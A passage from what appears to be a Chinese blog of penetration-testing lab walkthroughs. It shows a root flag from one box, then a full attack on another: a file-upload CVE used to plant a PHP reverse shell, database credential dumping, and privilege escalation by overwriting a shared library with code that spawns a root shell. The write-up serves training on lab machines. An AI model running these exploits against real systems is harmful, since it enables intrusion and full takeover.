class="hljs-keyword">function</span></span> ‘unlink’ [-Wimplicit-<span class="hljs-function"><span class="hljs-keyword">function</span></span>-declaration]<br>    <span class="hljs-number">6</span> |  unlink(<span class="hljs-string">&quot;/etc/ld.so.preload&quot;</span>);<br>      |  ^~~~~~<br>pe.c:<span class="hljs-number">7</span>:<span class="hljs-number">2</span>: warning: <span class="hljs-keyword">implicit</span> declaration of <span class="hljs-function"><span class="hljs-keyword">function</span></span> ‘setgid’ [-Wimplicit-<span class="hljs-function"><span class="hljs-keyword">function</span></span>-declaration]<br>    <span class="hljs-number">7</span> |  setgid(<span class="hljs-number">0</span>);<br>      |  ^~~~~~<br>pe.c:<span class="hljs-number">8</span>:<span class="hljs-number">2</span>: warning: <span class="hljs-keyword">implicit</span> declaration of <span class="hljs-function"><span class="hljs-keyword">function</span></span> ‘setuid’ [-Wimplicit-<span class="hljs-function"><span class="hljs-keyword">function</span></span>-declaration]<br>    <span class="hljs-number">8</span> |  setuid(<span class="hljs-number">0</span>);<br>      |  ^~~~~~<br></code></pre></td></tr></table></figure><p><strong>ROOT FLAG</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@Tree:~# <span class="hljs-built_in">cat</span> root.txt <br>flag&#123;root-594359512f516a5f9c80930b6c388d10&#125;<br></code></pre></td></tr></table></figure><h1 id="【总结】"><a href="#【总结】" class="headerlink" title="【总结】"></a>【总结】</h1><h2 id="1、Xpath注入"><a href="#1、Xpath注入" class="headerlink" title="1、Xpath注入"></a>1、Xpath注入</h2><p><a href="https://xz.aliyun.com/news/7386">https://xz.aliyun.com/news/7386</a></p><h2 id="2、Tree提权"><a href="#2、Tree提权" class="headerlink" title="2、Tree提权"></a>2、Tree提权</h2><p><code>--fromfile</code>读取文件内容<br><code>-o</code>写入文件<br><code>-i,--noreport</code>清理写入数据</p><p>提权方法：</p><ul><li>读取文件，如<code>/etc/shadow</code></li><li>写入私钥</li><li>写入<code>sudoers</code></li><li><code>LD_PRELOAD</code>共享库预加载</li></ul>]]></content>
    
    
    <categories>
      
      <category>Maze-sec</category>
      
    </categories>
    
    
    <tags>
      
      <tag>xpath注入</tag>
      
      <tag>sudo-tree</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Sml</title>
    <link href="/Maze-sec/Sml/"/>
    <url>/Maze-sec/Sml/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="靶机说明"><a href="#靶机说明" class="headerlink" title="靶机说明"></a>靶机说明</h1><p>QQ群：<code>660930334</code></p><h1 id="一、主机探测"><a href="#一、主机探测" class="headerlink" title="一、主机探测"></a>一、主机探测</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec/sml]<br>└─# nmap -sn 192.168.2.0/24               <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-10 15:36 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.1<br>Host is up (0.00044s latency).<br>MAC Address: 0A:00:27:00:00:0A (Unknown)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.2<br>Host is up (0.00027s latency).<br>MAC Address: 08:00:27:DB:21:14 (Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.52<br>Host is up (0.00096s latency).<br>MAC Address: 08:00:27:96:5F:B8 (Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.4<br>Host is up.<br>Nmap <span class="hljs-keyword">done</span>: 256 IP addresses (4 hosts up) scanned <span class="hljs-keyword">in</span> 2.04 seconds<br></code></pre></td></tr></table></figure><p>靶机IP：<code>192.168.2.52</code></p><h1 id="二、端口扫描"><a href="#二、端口扫描" class="headerlink" title="二、端口扫描"></a>二、端口扫描</h1><h2 id="1、全端口扫描"><a href="#1、全端口扫描" class="headerlink" title="1、全端口扫描"></a>1、全端口扫描</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec/sml]<br>└─# nmap --min-rate 10000 -p- 192.168.2.52                   <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-10 17:13 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.52<br>Host is up (0.00058s latency).<br>Not shown: 65533 closed tcp ports (reset)<br>PORT   STATE SERVICE<br>22/tcp open  ssh<br>80/tcp open  http<br>MAC Address: 08:00:27:96:5F:B8 (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 39.98 seconds<br></code></pre></td></tr></table></figure><p>开放端口：<code>22,80</code></p><h2 id="2、详细信息扫描"><a href="#2、详细信息扫描" class="headerlink" title="2、详细信息扫描"></a>2、详细信息扫描</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec/sml]<br>└─# nmap --min-rate 10000 -sT -sV -sC -O -p22,80 192.168.2.52               <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-10 17:13 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.52<br>Host is up (0.00049s latency).<br><br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)<br>| ssh-hostkey: <br>|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)<br>|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)<br>|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)<br>80/tcp open  http    Apache httpd 2.4.62 ((Debian))<br>| http-cookie-flags: <br>|   /: <br>|     PHPSESSID: <br>|_      httponly flag not <span class="hljs-built_in">set</span><br>|_http-server-header: Apache/2.4.62 (Debian)<br>|_http-title: Hello everyone!<br>MAC Address: 08:00:27:96:5F:B8 (Oracle VirtualBox virtual NIC)<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Device <span class="hljs-built_in">type</span>: general purpose<br>Running: Linux 4.X|5.X<br>OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5<br>OS details: Linux 4.15 - 5.8<br>Network Distance: 1 hop<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 8.51 seconds<br></code></pre></td></tr></table></figure><h2 id="3、UDP端口扫描"><a href="#3、UDP端口扫描" class="headerlink" title="3、UDP端口扫描"></a>3、UDP端口扫描</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec/sml]<br>└─# nmap -sU --top-ports 100 192.168.2.52<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-10 17:11 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.52<br>Host is up (0.00090s latency).<br>All 100 scanned ports on 192.168.2.52 are <span class="hljs-keyword">in</span> ignored states.<br>Not shown: 57 closed udp ports (port-unreach), 43 open|filtered udp ports (no-response)<br>MAC Address: 08:00:27:96:5F:B8 (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 53.81 seconds<br></code></pre></td></tr></table></figure><p>没有开放的端口</p><h1 id="三、WEB渗透"><a href="#三、WEB渗透" class="headerlink" title="三、WEB渗透"></a>三、WEB渗透</h1><p>访问80端口，是一个页面登录框<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202507131800092.png"></p><h2 id="1、employee-records-system-CVE"><a href="#1、employee-records-system-CVE" class="headerlink" title="1、employee_records_system-CVE"></a>1、employee_records_system-CVE</h2><p>查看页面源码，找到了是<code>employee_records_system</code>系统</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec/sml]<br>└─# curl http://192.168.2.52<br>&lt;!doctype html&gt;<br>&lt;html class=<span class="hljs-string">&quot;no-js&quot;</span> lang=<span class="hljs-string">&quot;&quot;</span>&gt;<br>    &lt;<span class="hljs-built_in">head</span>&gt;<br>        &lt;meta charset=<span class="hljs-string">&quot;utf-8&quot;</span>&gt;<br>        &lt;meta http-equiv=<span class="hljs-string">&quot;x-ua-compatible&quot;</span> content=<span class="hljs-string">&quot;ie=edge&quot;</span>&gt;<br>        &lt;title&gt;Hello everyone!&lt;/title&gt;<br>        &lt;meta name=<span class="hljs-string">&quot;description&quot;</span> content=<span class="hljs-string">&quot;&quot;</span>&gt;<br>        &lt;meta name=<span class="hljs-string">&quot;viewport&quot;</span> content=<span class="hljs-string">&quot;width=device-width, initial-scale=1&quot;</span>&gt;<br>        &lt;<span class="hljs-built_in">link</span> rel=<span class="hljs-string">&quot;stylesheet&quot;</span> <span class="hljs-built_in">type</span>=<span class="hljs-string">&quot;text/css&quot;</span> href=<span class="hljs-string">&quot;css/jquery-ui.css&quot;</span> /&gt;<br>        &lt;<span class="hljs-built_in">link</span> rel=<span class="hljs-string">&quot;stylesheet&quot;</span> <span class="hljs-built_in">type</span>=<span class="hljs-string">&quot;text/css&quot;</span> href=<span class="hljs-string">&quot;css/style.css&quot;</span> /&gt;<br>        &lt;<span class="hljs-built_in">link</span> href=<span class="hljs-string">&quot;css/font-awesome.min.css&quot;</span> <span class="hljs-built_in">type</span>=<span class="hljs-string">&quot;text/css&quot;</span> rel=<span class="hljs-string">&quot;stylesheet&quot;</span>&gt;<br>        &lt;<span class="hljs-built_in">link</span> href=<span class="hljs-string">&quot;https://fonts.googleapis.com/css?family=Lato&quot;</span> rel=<span class="hljs-string">&quot;stylesheet&quot;</span>&gt;<br>        &lt;<span class="hljs-built_in">link</span> href=<span class="hljs-string">&quot;https://fonts.googleapis.com/css?family=Roboto+Condensed&quot;</span> rel=<span class="hljs-string">&quot;stylesheet&quot;</span>&gt;<br>        &lt;script <span class="hljs-built_in">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span> src=<span class="hljs-string">&quot;js/jquery.min.js&quot;</span>&gt;&lt;/script&gt;<br>        &lt;script <span class="hljs-built_in">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span> src=<span class="hljs-string">&quot;js/jquery-ui.min.js&quot;</span>&gt;&lt;/script&gt;<br>    &lt;/head&gt;<br> &lt;body <span class="hljs-built_in">id</span>=<span class="hljs-string">&quot;loginPage&quot;</span>&gt;<br>        &lt;div class=<span class="hljs-string">&quot;login_wrapper clearfix&quot;</span>&gt;<br>                &lt;div class=<span class="hljs-string">&quot;LogResponse&quot;</span>&gt;&lt;/div&gt;<br>                &lt;div class=<span class="hljs-string">&quot;login_wrapper_inner&quot;</span>&gt;<br>&lt;!-- https://www.sourcecodester.com/sites/default/files/download/oretnom23/employee_records_system.zip --&gt;<br>                        &lt;form <span class="hljs-built_in">id</span>=<span class="hljs-string">&quot;loginForm&quot;</span> class=<span class="hljs-string">&quot;clearfix&quot;</span> method=<span class="hljs-string">&quot;post&quot;</span> action=<span class="hljs-string">&quot;&quot;</span>&gt;<br>                                &lt;div class=<span class="hljs-string">&quot;input-box&quot;</span>&gt;<br>                                        &lt;input <span class="hljs-built_in">type</span>=<span class="hljs-string">&quot;text&quot;</span> class=<span class="hljs-string">&quot;inputField username&quot;</span> name=<span class="hljs-string">&quot;username&quot;</span> placeholder=<span class="hljs-string">&quot;username&quot;</span>&gt;<br>                                        &lt;div class=<span class="hljs-string">&quot;error usernameerror&quot;</span>&gt;&lt;/div&gt;<br>                                &lt;/div&gt;<br>                                &lt;div class=<span class="hljs-string">&quot;input-box&quot;</span>&gt;<br>                                        &lt;input  <span class="hljs-built_in">type</span>=<span class="hljs-string">&quot;password&quot;</span> class=<span class="hljs-string">&quot;inputField password&quot;</span> name=<span class="hljs-string">&quot;password&quot;</span> placeholder=<span class="hljs-string">&quot;password&quot;</span>&gt;<br>                                        &lt;div class=<span class="hljs-string">&quot;error passworderror&quot;</span>&gt;&lt;/div&gt;<br>                                &lt;/div&gt;<br><br>                                &lt;div class=<span class="hljs-string">&quot;input-box&quot;</span>&gt;<br>                                        &lt;button  <span class="hljs-built_in">type</span>=<span class="hljs-string">&quot;submit&quot;</span> class=<span class="hljs-string">&quot;submitField sign_in&quot;</span>&gt;&lt;span class=<span class="hljs-string">&quot;sign-icon&quot;</span>&gt;&lt;i class=<span class="hljs-string">&quot;fa fa-lock&quot;</span>&gt;&lt;/i&gt;&lt;/span&gt; Sign <span class="hljs-keyword">in</span>&lt;/button&gt;<br>                                &lt;/div&gt;<br>                        &lt;/form&gt;<br>                &lt;/div&gt;<br>        &lt;/div&gt;<br> &lt;div class=<span class="hljs-string">&quot;body_overlay&quot;</span>&gt;&lt;/div&gt;<br> <br>  &lt;script <span class="hljs-built_in">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span> src=<span class="hljs-string">&quot;./js/global.js&quot;</span>&gt;&lt;/script&gt;<br> &lt;/body&gt;<br> &lt;/html&gt;<br></code></pre></td></tr></table></figure><p>查找<code>employee_records_system</code>的CVE漏洞，找到存在文件上传的漏洞<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202507131802727.png"></p><p>上传反弹shell的文件，得到上传后的文件名<code>UnIhBA3TZQwDVPf_rev.php</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec/sml]<br>└─# curl http://192.168.2.52/dashboard/uploadID.php -X POST -F <span class="hljs-string">&#x27;employee_ID=@rev.php;filename=rev.php&#x27;</span> <br>&#123;<span class="hljs-string">&quot;upload_filename&quot;</span>:<span class="hljs-string">&quot;UnIhBA3TZQwDVPf_rev.php&quot;</span>,<span class="hljs-string">&quot;selected_filename&quot;</span>:<span class="hljs-string">&quot;rev.php&quot;</span>&#125;  <br></code></pre></td></tr></table></figure><h1 id="四、获取www-data权限"><a href="#四、获取www-data权限" class="headerlink" title="四、获取www-data权限"></a>四、获取www-data权限</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec/sml]<br>└─# nc -lvnp 4444                                                                                                           <br>listening on [any] 4444 ...<br>connect to [192.168.2.4] from (UNKNOWN) [192.168.2.52] 55854<br>/usr/bin/script -qc /bin/bash /dev/null<br>www-data@sML:/var/www/html/uploads/employees_ids$ <span class="hljs-built_in">id</span><br><span class="hljs-built_in">id</span><br>uid=33(www-data) gid=33(www-data) <span class="hljs-built_in">groups</span>=33(www-data)<br></code></pre></td></tr></table></figure><p><strong>USER FLAG</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@sML:/home/yulian$ <span class="hljs-built_in">cat</span> user.txt <br>flag&#123;user-fde7951c3a57bc71b03631a9673ab67e&#125;<br></code></pre></td></tr></table></figure><h1 id="五、权限提升"><a href="#五、权限提升" class="headerlink" title="五、权限提升"></a>五、权限提升</h1><h2 id="1、获取USER权限"><a href="#1、获取USER权限" class="headerlink" title="1、获取USER权限"></a>1、获取USER权限</h2><p>找到数据库的用户名和密码，进行连接</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@sML:/var/www/html/inc$ <span class="hljs-built_in">cat</span> db_connect.php <br>&lt;?php<br><span class="hljs-variable">$mysql_hostname</span> = <span class="hljs-string">&quot;localhost&quot;</span>;<br><span class="hljs-variable">$mysql_user</span> = <span class="hljs-string">&quot;root&quot;</span>;<br><span class="hljs-variable">$mysql_password</span> = <span class="hljs-string">&quot;root&quot;</span>;<br><span class="hljs-variable">$mysql_database</span> = <span class="hljs-string">&quot;sharp_db&quot;</span>;<br><br><span class="hljs-variable">$db_connect</span> = mysqli_connect(<span class="hljs-variable">$mysql_hostname</span>, <span class="hljs-variable">$mysql_user</span>,<span class="hljs-variable">$mysql_password</span>, <span class="hljs-variable">$mysql_database</span>) or (<span class="hljs-string">&quot;Could not connect database&quot;</span>);<br>?&gt;<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@sML:/var/www/html/inc$ mysql -u root -p<br>Enter password: <br>Welcome to the MariaDB monitor.  Commands end with ; or \g.<br>Your MariaDB connection <span class="hljs-built_in">id</span> is 15<br>Server version: 10.5.23-MariaDB-0+deb11u1 Debian 11<br><br>Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.<br><br>Type <span class="hljs-string">&#x27;help;&#x27;</span> or <span class="hljs-string">&#x27;\h&#x27;</span> <span class="hljs-keyword">for</span> <span class="hljs-built_in">help</span>. Type <span class="hljs-string">&#x27;\c&#x27;</span> to clear the current input statement.<br><br>MariaDB [(none)]&gt;  <span class="hljs-keyword">select</span> * from <span class="hljs-built_in">users</span>;<br>+---------+-----------+----------+----------+----------------------------------+-------------+<br>| user_id | firstname | lastname | username | password                         | accounttype |<br>+---------+-----------+----------+----------+----------------------------------+-------------+<br>|       1 | Maxwell   | Morrison | xxx2xy   | 10a55271c201e41913764ff95b33248b | Admin       |<br>|       3 | Maxwell   | Morrison | admins   | 02adcdf2171dc7e5757cdd7c0b91fa03 | Admin       |<br>|       2 | Maxwell   | Morrison | yulian   | fde7951c3a57bc71b03631a9673ab67e | Admin       |<br>+---------+-----------+----------+----------+----------------------------------+-------------+<br>3 rows <span class="hljs-keyword">in</span> <span class="hljs-built_in">set</span> (0.000 sec)<br></code></pre></td></tr></table></figure><p>找到用户<code>yulian</code>的密码<code>fde7951c3a57bc71b03631a9673ab67e</code>，进行连接</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec/sml]<br>└─# ssh yulian@192.168.2.52<br>yulian@192.168.2.52<span class="hljs-string">&#x27;s password: </span><br><span class="hljs-string">Linux sML 4.19.0-27-amd64 #1 SMP Debian 4.19.316-1 (2024-06-25) x86_64</span><br><span class="hljs-string"></span><br><span class="hljs-string">The programs included with the Debian GNU/Linux system are free software;</span><br><span class="hljs-string">the exact distribution terms for each program are described in the</span><br><span class="hljs-string">individual files in /usr/share/doc/*/copyright.</span><br><span class="hljs-string"></span><br><span class="hljs-string">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span><br><span class="hljs-string">permitted by applicable law.</span><br><span class="hljs-string">yulian@sML:~$ id</span><br><span class="hljs-string">uid=1000(yulian) gid=1000(yulian) groups=1000(yulian)</span><br></code></pre></td></tr></table></figure><h2 id="2、重新构造库文件"><a href="#2、重新构造库文件" class="headerlink" title="2、重新构造库文件"></a>2、重新构造库文件</h2><p>用户<code>yulian</code>的<code>/home</code>目录下面找到一个文件<code>get_root</code>，尝试去运行，发现输出<code>hello world</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@sML:/home/yulian$ ./get_root<br>Starting get_root program...<br>hello world<br></code></pre></td></tr></table></figure><p>查看文件加载的库，发现加载了<code>/usr/lib/sML/libxxoo.so</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">yulian@sML:~$ ldd get_root <br>        linux-vdso.so.1 (0x00007ffd20857000)<br>        libxxoo.so =&gt; /usr/lib/sML/libxxoo.so (0x00007fe9c25be000)<br>        libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007fe9c23e1000)<br>        /lib64/ld-linux-x86-64.so.2 (0x00007fe9c25ca000)<br></code></pre></td></tr></table></figure><p>查看库</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs bash">yulian@sML:~$ strings /usr/lib/sML/libxxoo.so<br>__gmon_start__<br>_ITM_deregisterTMCloneTable<br>_ITM_registerTMCloneTable<br>__cxa_finalize<br>hello<br>puts<br>libc.so.6<br>GLIBC_2.2.5<br>u/UH<br>hello world<br>;*3$<span class="hljs-string">&quot;</span><br><span class="hljs-string">GCC: (Debian 10.2.1-6) 10.2.1 20210110</span><br><span class="hljs-string">crtstuff.c</span><br><span class="hljs-string">deregister_tm_clones</span><br><span class="hljs-string">__do_global_dtors_aux</span><br><span class="hljs-string">completed.0</span><br><span class="hljs-string">__do_global_dtors_aux_fini_array_entry</span><br><span class="hljs-string">frame_dummy</span><br><span class="hljs-string">__frame_dummy_init_array_entry</span><br><span class="hljs-string">xxoo.c</span><br><span class="hljs-string">__FRAME_END__</span><br><span class="hljs-string">_fini</span><br><span class="hljs-string">__dso_handle</span><br><span class="hljs-string">_DYNAMIC</span><br><span class="hljs-string">__GNU_EH_FRAME_HDR</span><br><span class="hljs-string">__TMC_END__</span><br><span class="hljs-string">_GLOBAL_OFFSET_TABLE_</span><br><span class="hljs-string">_init</span><br><span class="hljs-string">_ITM_deregisterTMCloneTable</span><br><span class="hljs-string">puts@GLIBC_2.2.5</span><br><span class="hljs-string">hello</span><br><span class="hljs-string">__gmon_start__</span><br><span class="hljs-string">_ITM_registerTMCloneTable</span><br><span class="hljs-string">__cxa_finalize@GLIBC_2.2.5</span><br><span class="hljs-string">.symtab</span><br><span class="hljs-string">.strtab</span><br><span class="hljs-string">.shstrtab</span><br><span class="hljs-string">.note.gnu.build-id</span><br><span class="hljs-string">.gnu.hash</span><br><span class="hljs-string">.dynsym</span><br><span class="hljs-string">.dynstr</span><br><span class="hljs-string">.gnu.version</span><br><span class="hljs-string">.gnu.version_r</span><br><span class="hljs-string">.rela.dyn</span><br><span class="hljs-string">.rela.plt</span><br><span class="hljs-string">.init</span><br><span class="hljs-string">.plt.got</span><br><span class="hljs-string">.text</span><br><span class="hljs-string">.fini</span><br><span class="hljs-string">.rodata</span><br><span class="hljs-string">.eh_frame_hdr</span><br><span class="hljs-string">.eh_frame</span><br><span class="hljs-string">.init_array</span><br><span class="hljs-string">.fini_array</span><br><span class="hljs-string">.dynamic</span><br><span class="hljs-string">.got.plt</span><br><span class="hljs-string">.data</span><br><span class="hljs-string">.bss</span><br><span class="hljs-string">.comment</span><br></code></pre></td></tr></table></figure><p>重写一个库，覆盖<code>/usr/lib/sML/libxxoo.so</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">yulian@sML:~$ vi xxoo.c<br>yulian@sML:~$ <span class="hljs-built_in">cat</span> xxoo.c <br><span class="hljs-comment">#include&lt;stdlib.h&gt;</span><br><span class="hljs-comment">#include&lt;stdio.h&gt;</span><br><span class="hljs-comment">#include&lt;unistd.h&gt;</span><br><br><br><br>void <span class="hljs-function"><span class="hljs-title">hello</span></span>()&#123;<br>        setuid(0);<br>        setgid(0);<br>        system(<span class="hljs-string">&quot;/bin/bash -p&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>编译<code>xxoo.c</code>文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">yulian@sML:~$ gcc -shared -fPIC -o malicious.so xxoo.c<br></code></pre></td></tr></table></figure><p>将编译后的文件重定向至<code>/usr/lib/sML/libxxoo.so</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">yulian@sML:~$ <span class="hljs-built_in">cat</span> malicious.so &gt; /usr/lib/sML/libxxoo.so<br></code></pre></td></tr></table></figure><h2 id="2、获取ROOT权限"><a href="#2、获取ROOT权限" class="headerlink" title="2、获取ROOT权限"></a>2、获取ROOT权限</h2><p>直接运行<code>get_root</code>即可</p><figure class="highlight 